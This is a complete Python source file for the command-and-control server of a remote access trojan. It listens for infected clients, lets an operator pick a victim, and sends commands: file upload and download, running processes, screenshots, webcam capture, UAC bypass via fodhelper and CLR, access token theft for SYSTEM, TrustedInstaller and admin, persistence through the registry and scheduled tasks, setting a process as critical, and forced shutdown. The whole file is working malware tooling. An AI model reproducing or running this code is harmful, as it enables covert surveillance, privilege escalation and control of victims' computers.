# coding=utf-8
import os
import socket
import struct
import subprocess
import sys
import threading
import time

commands = {'help': ['Show this help'],
            'list': ['List connected clients'],
            'select': ['Select a client by its index'],
            'quit': ['Background current connection'],
            'kill': ['Kill current connection'],
            'lcd': ['Change local working directory'],
            'lls': ['List local files'],
            'upload': ['Upload a file to client'],
            'download': ['Download a file from client'],
            'run': ['Create a process without waiting for termination'],
            'screenshot': ['Grab a screenshot'],
            'webcam': ['Take a snapshot from webcam'],
            'idletime': ['Display how much time the user is inactive'],
            'bypassuac': ['Elevate as administrator without UAC prompt'],
            'stealtoken': ['Duplicate access token from a running process'],
            'persistence': ['Run automatically at startup'],
            'poweroff': ['Fast shutdown'],
            'setcritical': ['Set as critical process']
            }


class Server(object):

    def __init__(self):
        self.host = ''
        self.port = 9999
        self.socket = None
        self.connections = []
        self.addresses = []

    def create_socket(self):
        try:
            self.socket = socket.socket()
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind((self.host, self.port))
            self.socket.listen(5)
        except socket.error as e:
            print(e)
            sys.exit(1)

    def accept_connections(self):
        while True:
            try:
                conn, address = self.socket.accept()
                conn.setblocking(1)
                self.connections.append(conn)
                self.addresses.append(address)
                print('[+] Connection has been established: ' + address[0])
            except Exception as e:
                print('[-] Error accepting connections: ' + str(e))
                time.sleep(5)

    def start_shell(self):
        while True:
            try:
                cmd = input('flc> ')
                if not cmd:
                    continue
                elif cmd == 'help':
                    print_help()
                elif cmd in ['quit', 'exit']:
                    self.socket.close()
                    sys.exit(0)
                elif cmd == 'list':
                    self.list_connections()
                elif 'select' in cmd:
                    conn, target = self.get_target(cmd)
                    if conn is not None:
                        self.send_commands(conn, target)
                elif cmd[:2] == 'cd':
                    lcd(cmd[3:])
                elif cmd == 'ls':
                    lls()
                else:
                    print('[-] Command not recognized')
            except KeyboardInterrupt:
                self.socket.close()
                sys.exit(0)
            except Exception as e:
                os.system('')
                print('\033[0;31m[-] Error: ' + str(e) + '\033[0m')

    def list_connections(self):
        results = ''
        for i, conn in reversed(list(enumerate(self.connections))):
            try:
                send(conn, 'null')
                recv(conn)
            except:
                del self.connections[i]
                del self.addresses[i]
                continue
        for i, conn in enumerate(self.connections):
            results += str(i) + '   ' + str(self.addresses[i][0]) + '   ' + str(self.addresses[i][1]) + '\n'
        print('----- Clients -----' + '\n' + results)

    def get_target(self, cmd):
        try:
            target = cmd.replace('select', '')
            target = int(target)
            conn = self.connections[target]
            try:
                send(conn, 'null')
                recv(conn)
            except:
                del self.connections[target]
                del self.addresses[target]
                print('[-] Connection is unavailable')
                return None, None
            print('[+] Connected to ' + str(self.addresses[target][0]))
            return conn, target
        except:
            print('[-] Not a valid selection')
            return None, None

    def send_commands(self, conn, target):
        while True:
            try:
                cmd = input(recv(conn))
                if not cmd:
                    send(conn, 'null')
                elif cmd in ['quit', 'exit']:
                    send(conn, 'null')
                    break
                elif cmd == 'kill':
                    send(conn, cmd)
                    break
                elif cmd in ['cls', 'clear']:
                    subprocess.call('cls', shell=True)
                    send(conn, 'null')
                elif cmd[:3] == 'lcd':
                    lcd(cmd[4:])
                    send(conn, 'null')
                elif cmd == 'lls':
                    lls()
                    send(conn, 'null')
                elif cmd.split(' ')[0] == 'upload':
                    send_file(conn, str(cmd.split(' ')[1].strip()))
                elif cmd.split(' ')[0] == 'download':
                    send(conn, cmd)
                    recv_file(conn, str(os.path.basename(cmd.split(' ')[1].strip())))
                elif cmd.split(' ')[0] == 'run':
                    send(conn, cmd)
                    print(recv(conn))
                elif cmd == 'screenshot':
                    send(conn, cmd)
                    recv_file(conn, 'Screenshot_' + get_time() + '.png')
                elif cmd == 'webcam':
                    send(conn, cmd)
                    recv_file(conn, 'Webcam_' + get_time() + '.png')
                elif cmd in ['idletime', 'setcritical']:
                    send(conn, cmd)
                    print(recv(conn))
                elif cmd == 'bypassuac':
                    select(conn, ['bypassuac_fodhelper', 'bypassuac_clr'])
                elif cmd == 'persistence':
                    select(conn, ['persistence_registry', 'persistence_schtasks'])
                elif cmd == 'stealtoken':
                    select(conn, ['stealtoken_system', 'stealtoken_ti', 'stealtoken_admin'])
                elif cmd == 'poweroff':
                    send(conn, cmd)
                    break
                else:
                    send(conn, cmd)
                    print(recv_data(conn))
            except ConnectionResetError as e:
                print('[-] Connection was lost: ' + str(e))
                del self.connections[target]
                del self.addresses[target]
                break
            except KeyboardInterrupt:
                break
            except Exception as exception:
                send(conn, 'null')
                os.system('')
                print('\033[0;31m[-] Error: ' + str(exception) + '\033[0m')
                continue


def print_help():
    print('----- Commands -----')
    for k, v in commands.items():
        print('{0:15}{1}'.format(k, v[0]))
    print()


def lcd(path):
    if os.path.exists(path):
        os.chdir(path)
    print(os.getcwd())
    print()


def lls():
    root, dirs, files = next(os.walk(os.getcwd()))
    for dir_name in dirs:
        print(dir_name + '/')
    for filename in files:
        print(filename)
    print()


def send(conn, data):
    data = data.encode()
    conn.send(struct.pack('i', len(data)))
    conn.send(data)


def recv(conn):
    size = int(struct.unpack('i', conn.recv(4))[0])
    return conn.recv(size).decode()


def recv_data(conn):
    size = int(struct.unpack('i', conn.recv(4))[0])
    data = b''
    while size:
        buf = conn.recv(size)
        size -= len(buf)
        data += buf
    return data.decode()


def select(conn, cmds):
    try:
        s = ''
        for i, c in enumerate(cmds):
            s += str(i) + '. ' + c + '\n'
        print(s)
        i = input('Please select: ')
        try:
            cmd = cmds[int(i)]
        except (IndexError, ValueError):
            print('[-] Invalid input')
            send(conn, 'null')
            return
        send(conn, cmd)
        print(recv(conn))
    except KeyboardInterrupt:
        send(conn, 'null')


def get_time():
    return str(time.strftime('%Y-%m-%d_%H-%M-%S', time.localtime()))


def send_file(conn, filename):
    if os.path.isfile(filename):
        send(conn, 'upload ' + os.path.basename(filename))
        file_size = os.stat(filename).st_size
        head = struct.pack('i', file_size)
        print('[+] File size: ' + str(file_size) + ', uploading...')
        conn.send(head)
        file = open(filename, 'rb')
        while True:
            data = file.read(1024)
            if not data:
                break
            conn.send(data)
        file.close()
        print('[+] File uploaded: ' + filename)
    else:
        print('[-] File not found')
        send(conn, 'null')


def recv_file(conn, filename):
    isfile = int(struct.unpack('i', conn.recv(4))[0])
    if not isfile:
        print('[-] File not found')
        return
    file_size, = struct.unpack('i', conn.recv(4))
    print('[+] File size: ' + str(file_size) + ' bytes, downloading...')
    recv_size = 0
    file = open(filename, 'wb')
    while not recv_size == file_size:
        if file_size - recv_size > 1024:
            data = conn.recv(1024)
            recv_size += len(data)
        else:
            data = conn.recv(file_size - recv_size)
            recv_size = file_size
        file.write(data)
    file.close()
    print('[+] File saved: ' + filename)


server = Server()
server.create_socket()
threading.Thread(target=server.accept_connections, daemon=True).start()
server.start_shell()
